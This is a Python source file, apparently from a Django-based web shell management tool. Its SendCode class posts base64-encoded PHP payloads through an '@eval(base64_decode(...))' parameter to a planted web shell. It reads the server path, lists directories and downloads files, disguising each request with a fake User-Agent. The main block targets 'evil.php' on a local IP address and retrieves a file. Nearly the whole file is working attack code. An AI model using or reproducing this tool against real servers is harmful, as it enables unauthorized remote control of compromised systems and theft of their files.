import requests
from nife.core.phpCodeFun import getFilelistBase, getFilePathBase, getFile
from nife.core.fakeUseAgent import fake_agent
import json
import os
from django.conf import settings
from lxml import etree
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "WCnife.settings")

class SendCode(object):

    def __init__(self, url, pwd):
        self.url = url
        self.pwd = pwd
        self.data = dict()
        self.data[pwd]="@eval(base64_decode($_POST[ek]));"
        self.data["ek"] = ""
        self.r = requests.session()

    def getFilePath(self):
        """
        返回当前文件在目标服务器的绝对路径
        :return:
        """
        self.data["ek"] = getFilePathBase()
        header = {
            "User-Agent": fake_agent()
        }
        res = self.r.post(url=self.url, data=self.data, headers=header)
        page = etree.HTML(res.text)
        val = page.xpath('//ek/text()')[0]
        path = json.loads(val)['path']
        if '\\' in path:
            path = path.replace('\\', "/")
        return path

    def getFilelist(self, path):
        """
        返回文件列表
        :param path:
        :return:
        """
        self.data["ek"] = getFilelistBase(path=path)
        header = {
            "User-Agent": fake_agent()
        }
        res = self.r.post(url=self.url, data=self.data, headers=header)
        page = etree.HTML(res.text)
        val = page.xpath('//ek/text()')[0]
        file_list = json.loads(val)
        file_list = [x for x in file_list if x['name'] not in ['.', '..']]
        return file_list

    def getFile(self, name, path):
        """
        保存文件到服务器，返回文件的路径
        :param path:
        :return:
        """
        self.data["ek"] = getFile(path=path)
        header = {
            "User-Agent": fake_agent()
        }
        # res = self.r.post(url=self.url, data=self.data, headers=header, proxies={"http": '127.0.0.1:8080'})
        res = self.r.post(url=self.url, data=self.data, headers=header)
        filepath = settings.TMP_DIR + name
        # 存储到本地
        with open(filepath, 'wb') as f:
            f.write(res.content)
        return filepath


if __name__ == '__main__':
    # s = SendCode("http://172.28.100.13/PhpstormProjects/Cnife/eval_fun.php", 'cmd')
    s = SendCode("http://192.168.43.50/evil.php", 'cmd')
    path = s.getFile('2.jpg', r"C:\Users\elloit\Desktop\php\PHPTutorial\WWW\BWVS\favicon\2.jpg")
    print(path)
